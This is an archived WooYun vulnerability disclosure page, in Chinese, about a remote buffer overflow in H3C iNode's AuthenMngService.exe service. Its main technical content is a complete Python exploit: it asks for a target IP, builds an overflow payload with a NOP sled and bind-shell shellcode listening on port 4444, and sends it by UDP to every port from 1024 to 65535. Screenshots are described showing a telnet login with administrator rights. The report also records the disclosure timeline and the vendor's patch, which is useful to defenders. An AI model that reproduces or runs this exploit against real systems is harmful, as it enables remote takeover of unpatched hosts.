@@ -1,0 +1,317 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		iNode远程缓冲区溢出以管理员权限执行任意代码0Day漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		iNode远程缓冲区溢出以管理员权限执行任意代码0Day漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cssembly">cssembly</a> 
+</li><li>提交时间：		2013-04-12 10:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-16：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-19：	细节向第三方安全合作伙伴开放<br/>
+									2013-04-26：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-06：	细节向普通白帽子公开<br/>
+									2013-05-26：	细节向实习白帽子公开<br/>
+									2013-07-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">H3C iNode是杭州华三通信技术有限公司设计开发的一款用于用户认证上网的管理软件，该软件存在缓冲区溢出漏洞，攻击者可以远程发送攻击数据包，触发漏洞溢出，执行攻击shell。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">该漏洞存在于iNode软件安装后的AuthenMngService.exe文件中，它以管理员权限运行，并开启了一个端口，该服务模块存在缓冲区溢出漏洞，攻击者可以远程发送UDP攻击数据包，触发漏洞溢出，执行攻击shell。该漏洞涉及的软件版本：<br />
+<br />
+iNode PC 5.2 (E0402)<br />
+<br />
+iNode PC 5.1 (E0304)<br />
+<br />
+iNode PC 5.0 (E0105)<br />
+<br />
+其他低版本网上无法直接下载，未测试验证。<br />
+<br />
+漏洞位置在IDA反汇编结果的sub_459F10函数中，漏洞在0x45A235处的memcpy函数，位置如下：<br />
+<br />
+</p><p class="detail"><a href="../images/1210074915d57aab2d1d5c5f26be3b73914c3d77.png" target="_blank"><img src="../images/1210074915d57aab2d1d5c5f26be3b73914c3d77.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+拷贝的字节数有外部控制，因此传入恶意构造的数据，能够导致远程缓冲区溢出攻击 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">漏洞触发代码如下<br />
+<br />
+poc.py如下：<br />
+<br />
+import socket<br />
+<br />
+import time<br />
+<br />
+<br />
+<br />
+Exploit_addr = raw_input( &quot;input attack ip addr : &quot; )<br />
+<br />
+<br />
+<br />
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />
+<br />
+#绑定4444端口shellcode，溢出成功后通过可telnet登陆目标主机<br />
+<br />
+shellcode = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31&quot;\<br />
+<br />
+            &quot;\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52&quot;\<br />
+<br />
+            &quot;\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;\<br />
+<br />
+            &quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1&quot;\<br />
+<br />
+            &quot;\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52&quot;\<br />
+<br />
+            &quot;\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;\<br />
+<br />
+            &quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b&quot;\<br />
+<br />
+            &quot;\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b&quot;\<br />
+<br />
+            &quot;\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;\<br />
+<br />
+            &quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b&quot;\<br />
+<br />
+            &quot;\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3&quot;\<br />
+<br />
+            &quot;\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;\<br />
+<br />
+            &quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b&quot;\<br />
+<br />
+            &quot;\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b&quot;\<br />
+<br />
+            &quot;\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68&quot;\<br />
+<br />
+            &quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07&quot;\<br />
+<br />
+            &quot;\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;\<br />
+<br />
+            &quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50&quot;\<br />
+<br />
+            &quot;\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf&quot;\<br />
+<br />
+            &quot;\xe0\xff\xd5\x89\xc7\x31\xdb\x53\x68\x02&quot;\<br />
+<br />
+            &quot;\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68&quot;\<br />
+<br />
+            &quot;\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7&quot;\<br />
+<br />
+            &quot;\xe9\x38\xff\xff\xd5\x53\x53\x57\x68\x74&quot;\<br />
+<br />
+            &quot;\xec\x3b\xe1\xff\xd5\x57\x89\xc7\x68\x75&quot;\<br />
+<br />
+            &quot;\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00&quot;\<br />
+<br />
+            &quot;\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59&quot;\<br />
+<br />
+            &quot;\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01&quot;\<br />
+<br />
+            &quot;\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56&quot;\<br />
+<br />
+            &quot;\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68&quot;\<br />
+<br />
+            &quot;\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56&quot;\<br />
+<br />
+            &quot;\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5&quot;\<br />
+<br />
+            &quot;\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d&quot;\<br />
+<br />
+            &quot;\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;\<br />
+<br />
+            &quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff&quot;\<br />
+<br />
+            &quot;\xd5&quot;<br />
+<br />
+<br />
+<br />
+exploit_data=&#039;\x00\x01&#039;+&#039;A&#039;*14+&#039;\xDA\xF4\x54\xA3\x57\xEA\xA2\x58\xFF\xA0\x61\xD7\xFB\xAF\x3C\x9C&#039; + &#039;\x01\x01\x01\x21\x08&#039; + &#039;\x22&#039; * 7 + &#039;\x01&#039; + &#039;\x90&#039; * 335 + shellcode + &#039;\xE9\x13\xFE\xFF\xFF&#039; + &#039;A&#039; * 7 + &#039;\xEB\xF2\x90\x90\x71\x15\xFA\x7F&#039; + &#039;\x71\x15\xFA\x7F&#039; + &#039;\x90&#039; * 15 + &#039;\xEB\xE3&#039;<br />
+<br />
+<br />
+<br />
+for port in range( 1024 , 65536):<br />
+<br />
+    address = ( Exploit_addr , port )<br />
+<br />
+    s.sendto( exploit_data , address )<br />
+<br />
+    print &#039;port : &#039; , port<br />
+<br />
+    time.sleep(0.001)<br />
+<br />
+<br />
+<br />
+s.close()<br />
+<br />
+print &#039;Exploit End&#039;<br />
+<br />
+raw_input()<br />
+<br />
+<br />
+<br />
+漏洞证明：<br />
+<br />
+安装软件后，AuthenMngService.exe以管理员权限运行。开启攻击程序输入地址进行攻击<br />
+<br />
+</p><p class="detail"><a href="../images/1210201368ded804eef87e7bd396aa5f041b87a3.png" target="_blank"><img src="../images/1210201368ded804eef87e7bd396aa5f041b87a3.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/12102023b1e4670d910243bd35e07e1452cc4df5.png" target="_blank"><img src="../images/12102023b1e4670d910243bd35e07e1452cc4df5.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+攻击程序运行结束后，可以看到程序并未退出，开启telnet准备连接目标<br />
+<br />
+</p><p class="detail"><a href="../images/12102034ee13a817af8e8373bc7dfa2d4b370853.png" target="_blank"><img src="../images/12102034ee13a817af8e8373bc7dfa2d4b370853.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+可以看到已经远程登录到目标系统，而被攻击程序并未退出。<br />
+<br />
+</p><p class="detail"><a href="../images/1210231179821bfaf387e91ba1c70b62392896f5.png" target="_blank"><img src="../images/1210231179821bfaf387e91ba1c70b62392896f5.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+输入calc.exe命令，启动计算器，可以看到calc.exe为管理员权限。<br />
+<br />
+</p><p class="detail"><a href="../images/121023378728140fbfd3b2f0a545036f89722f72.png" target="_blank"><img src="../images/121023378728140fbfd3b2f0a545036f89722f72.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cssembly" title="cssembly">cssembly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021657" title="iNode远程缓冲区溢出以管理员权限执行任意代码0Day漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-04-16 23:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-04-23：4月23日，经过CNVD协调，H3C（华三公司）已经发布了针对漏洞的解决方案，发布了新的inode版本。
+
+参考链接：
+
+http://kms.h3c.com/kms/kms/search/view.html?id=23553</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21657";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
